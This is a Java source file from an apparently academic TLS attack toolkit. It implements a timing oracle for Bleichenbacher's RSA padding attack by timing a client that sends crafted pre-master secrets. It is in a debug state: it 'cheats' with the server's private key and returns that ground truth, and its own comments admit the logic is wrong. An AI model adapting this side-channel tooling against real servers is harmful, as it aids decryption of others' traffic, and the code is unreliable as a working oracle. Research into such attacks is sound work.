package de.rub.nds.ssl.attacker.bleichenbacher.oracles;

import de.rub.nds.ssl.attacker.bleichenbacher.OracleException;
import de.rub.nds.ssl.attacker.bleichenbacher.OracleType;
import de.rub.nds.ssl.attacker.misc.CommandLineWorkflowExecutor;
import de.rub.nds.ssl.attacker.misc.PKCS15Toolkit;
import de.rub.nds.ssl.attacker.misc.Utility;
import java.io.FileWriter;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

/**
 * Stripped down version of the Timing Oracle.
 *
 * @author Christopher Meyer - christopher.meyer@rub.de
 * @version 0.1
 *
 * Jun 27, 2013
 */
public final class CommandLineTimingOracle extends AOracle {

    /*
     * CONFIGURATION SECTION
     */
    /**
     * Amount of training measurements per Oracle request.
     */
    private static final int MEASUREMENT_AMOUNT = 500;
    /**
     * Amount of training measurementsTest.
     */
    private static final int TRAINING_AMOUNT = 100;
    /**
     * Amount of warmup measurementsTest.
     */
    private static final int WARMUP_AMOUNT = 50;
    /**
     * Boundary to distinguish PKCS valid (but PMS invalid) from PKCS invalid.
     */
    private static final int MIN_BOX_POS = 15;
    /**
     * Boundary to distinguish PKCS invalid from PKCS valid (but PMS invalid).
     */
    private static final int MAX_BOX_POS = 20;
    /*
     * RUNTIME DATA SECTION
     */
    /**
     * Bridge to the executing client.
     */
    private CommandLineWorkflowExecutor clwe;
    /**
     * List of valid timings.
     */
    private ArrayList<Long> validTimings = new ArrayList<>(TRAINING_AMOUNT);
    /**
     * List of invalid timings.
     */
    private ArrayList<Long> invalidTimings = new ArrayList<>(TRAINING_AMOUNT);

    /**
     * Cipher (needed for the cheat operation).
     */
    private Cipher cipher;
    /**
     * Valid PKCS encrypted PMS.
     */
    private byte[] case1PMS;
    /**
     * Valid PKCS encrypted PMS (starts with 00 02), but PMS itself is invalid.
     */
    private byte[] case2PMS;
    /**
     * Invalid PKCS encrypted PMS.
     */
    private byte[] case3PMS;
    /**
     * TEMPORARY TEWAKS
     */
    private int minBoxPos = 10;
    private int maxBoxPos = 15;
    /**
     * Round counter - trick to speed up finding:
     */
    private int round = 0;
    
    /**
     * Status counter to find the amount of errors the TimingOracle caused. The
     * format is {groundTruth}_{timingOracle}
     */
    private int valid_valid = 0;
    private int valid_invalid = 0;
    private int invalid_valid = 0;
    private int invalid_invalid = 0;

    /**
     * Create a new instance of this object.
     *
     * @param type Oracle type.
     * @param rsaPublicKey Public key of the server.
     * @param rsaPrivateKey Private key of the server - needed for cheating.
     * @param command Command to be executed.
     */
    public CommandLineTimingOracle(final OracleType type,
            final RSAPublicKey rsaPublicKey,
            final RSAPrivateKey rsaPrivateKey, final String command) {
        this.publicKey = rsaPublicKey;
        this.oracleType = type;
        this.blockSize = Utility.computeBlockSize(rsaPublicKey);
        try {
            this.cipher = Cipher.getInstance("RSA/None/NoPadding");
            this.cipher.init(Cipher.DECRYPT_MODE, rsaPrivateKey);
        } catch (InvalidKeyException | NoSuchAlgorithmException |
                NoSuchPaddingException ex) {
            ex.printStackTrace();
        }

        this.clwe = new CommandLineWorkflowExecutor(command);
    }

    /**
     * This method performs the statistical analysis of the timing
     * measurementsTest. It assumes that a valid key has a significantly lower
     * response time than an invalid key. In a nutshell, the method performs
     * Crosby's box test.
     *
     * @param testPMS PKCS to be tested for validity.
     * @param firstRun Is this the first run of this method (recursion)?
     * @return True if the PKCS was a valid one or false otherwise.
     * @throws OracleException
     */
    private boolean isValidPKCS(final byte[] testPMS, final boolean firstRun)
            throws OracleException {
        long[] caseXTiming = new long[MEASUREMENT_AMOUNT];
        long[] testTiming = new long[MEASUREMENT_AMOUNT];
        
        Random r = new Random();
            
        for (int i = 0; i < MEASUREMENT_AMOUNT; i++) {
            if((r.nextInt() % 2) == 0) {
                caseXTiming[i] = clwe.executeClientWithPMS(getCase2PMS());
                testTiming[i]  = clwe.executeClientWithPMS(testPMS);
            } else {
                testTiming[i]  = clwe.executeClientWithPMS(testPMS);
                caseXTiming[i] = clwe.executeClientWithPMS(getCase2PMS());
            }
        }

        Arrays.sort(caseXTiming);
        Arrays.sort(testTiming);
        
        /* Now write it out to a file. */
        try {
            FileWriter fwCaseX = new FileWriter(round + "_caseX.csv", false);
            FileWriter fwTest = new FileWriter(round + "_test.csv", false);
            int i = 0;
            for(long caseX : caseXTiming) {
                fwCaseX.write(i + ";caseX;" + caseX + "\n");
                i += 1;
            }
            
            for(long test : testTiming) {
                fwTest.write(i + ";test;" + test + "\n");
                i += 1;
            }
            fwCaseX.close();
            fwTest.close();
        } catch (IOException ex) {
            Logger.getLogger(CommandLineTimingOracle.class.getName()).log(Level.SEVERE, null, ex);
        }
        
        System.out.println("    timing: " + (caseXTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100] - testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100]));
        
        // TODO: From here on, everything is wrong
        //if(case2Timing[(maxBoxPos * MEASUREMENT_AMOUNT) / 100] > testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100]) {
        if((caseXTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100] - testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100]) > 9000) {
            //if(firstRun) {
            //    return isValidPKCS(testPKCS, false);
            //}
            return true;
        } else {
            return false;
        }
    }

    /**
     * Warmup function - prepares the target.
     *
     * @throws OracleException
     */
    public void warmup() throws OracleException {
        // warmup
        System.out.print("warmup... ");
        for (int i = 0; i < WARMUP_AMOUNT / 2; i++) {
            clwe.executeClientWithPMS(getCase1PMS());
            clwe.executeClientWithPMS(getCase3PMS());
            System.out.println(i + "th round");
        }
        System.out.println("done!");
    }

    /**
     * Train the timing oracle.
     *
     * @throws OracleException
     */
    public void trainOracle() throws OracleException {

        long delay;
        // train the oracle using the executeWorkflow functionality
        for (int i = 0; i < TRAINING_AMOUNT; i++) {
            delay = clwe.executeClientWithPMS(getCase1PMS());
            validTimings.add(delay);

            delay = clwe.executeClientWithPMS(getCase3PMS());
            invalidTimings.add(delay);

            if (i % 50 == 0) {
                System.out.print("\r left requests for training "
                        + (TRAINING_AMOUNT - i));
            }
        }
        System.out.println("\n");
        try (FileWriter fw = new FileWriter("training_data.csv");) {
            for (int i = 0; i < TRAINING_AMOUNT; i++) {
                fw.write(i + ";invalid;" + invalidTimings.get(i) + "\n");
                fw.write((i + TRAINING_AMOUNT) + ";valid;"
                        + validTimings.get(i) + "\n");
            }
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    @Override
    public boolean checkPKCSConformity(final byte[] testPMS)
            throws OracleException {
        boolean result;
        boolean groundTruth = false;
        
        round += 1;
    
        
        if(round % 1000 == 0) {
            System.out.print("\r--> round " + round);
        }
        
        if( (round < 2500) ) {
            // TODO: Ooooh jeeeee!
            // return groundTruth;
            return false;
        }
        
        System.out.println("");
        System.out.println("################### New Measurement #########################");
        
        groundTruth = cheat(testPMS);
        
        if((round % 10) == 0) {
            System.out.println("#######################");
            System.out.println("++ valid_valid:     " + valid_valid);
            System.out.println("++ invalid_invalid: " + invalid_invalid);
            System.out.println("-- valid_invalid:   " + valid_invalid);
            System.out.println("-- invalid_valid:   " + invalid_valid);
            System.out.println("#######################");
        }

        numberOfQueries++;
        boolean timingOracleAnswer = isValidPKCS(testPMS, true);

        if (!groundTruth) {
            if (!timingOracleAnswer) {
                /*
                 * all good!
                 */
                valid_invalid++;
                result = timingOracleAnswer;
                // System.err.println("OK: invalid key was predicted to "
                //        + "be invalid");
            } else {
                /*
                 * The submitted key was invalid but our test predicted 
                 * that the key was valid. This is the worst case, because 
                 * it will most certainly break the subsequent computations. 
                 */
                valid_invalid++;
                //System.err.println("ERROR: invalid key was predicted to "
                //        + "be valid. Stopping.");
                
                
                // TODO: Nur zum Debuggen:
                result = groundTruth;
                // result = timingOracleAnswer;
                // System.exit(1);
            }

        } else {
            if (!timingOracleAnswer) {
                /*
                 * The submitted key was valid but our test predicted that 
                 * the key was invalid. This decreases the performance of 
                 * the attack but does not necessarily break subsequent 
                 * computations.
                 */
                invalid_valid++;
                System.err.println("ERROR: valid key was predicted to "
                        + "be invalid. This decreases the attack "
                        + "performance.");
                result = timingOracleAnswer;
            } else {
                /*
                 * all good!
                 */
                invalid_invalid++;

                // System.err.println("OK: valid key was predicted to "
                //        + "be valid");
                result = timingOracleAnswer;
            }
        }
        
        System.out.println(round + ": Ground truth: " + groundTruth
                + ", timingoracle: " + result);

        //return result;
        return groundTruth;
        
    }

    /**
     * Cheat - needed to confirm a guess.
     *
     * @param encryptedPMS Pre Master Secret.
     * @return true if the PMS is valid, false otherwise
     */
    private boolean cheat(final byte[] encryptedPMS) {
        boolean result = false;
        try {
            byte[] decryptedPMS = cipher.doFinal(encryptedPMS);            
            result = PKCS15Toolkit.conformityChecker(decryptedPMS,
                    oracleType, blockSize);
        } catch (BadPaddingException | IllegalBlockSizeException e) {
            e.printStackTrace();
        }

        return result;
    }

    /**
     * Get the valid encrypted PMS.
     *
     * @return Valid PKCS encoded, encrypted PMS (deep copy)
     */
    public byte[] getCase1PMS() {
        return case1PMS;
    }

    /**
     * Set the valid encrypted PMS.
     *
     * @param valid Valid PKCS encoded, encrypted PMS to set (creating
     * deep-copied)
     */
    public void setCase1PMS(final byte[] valid) {
        this.case1PMS = valid.clone();
    }
    

    /**
     * Get the valid encrypted PMS.
     * @return Valid PKCS encoded, encrypted PMS
     */
    public byte[] getCase2PMS() {
        return case2PMS;
    }

    /**
     * Set the valid encrypted PMS.
     * @param valid Valid PKCS encoded, encrypted PMS to set
     */
    public void setCase2PMS(final byte[] case2PMS) {
        this.case2PMS = case2PMS.clone();
    }

    /**
     * Get the invalid encrypted PMS.
     *
     * @return Invalid PKCS encoded, encrypted PMS (deep copy)
     */
    public byte[] getCase3PMS() {
        return case3PMS;
    }

    /**
     * Set the invalid encrypted PMS.
     *
     * @param invalid Invalid PKCS encoded, encrypted PMS to set (creating
     * deep-copied)
     */
    public void setCase3PMS(final byte[] invalid) {
        this.case3PMS = invalid.clone();
    }
}
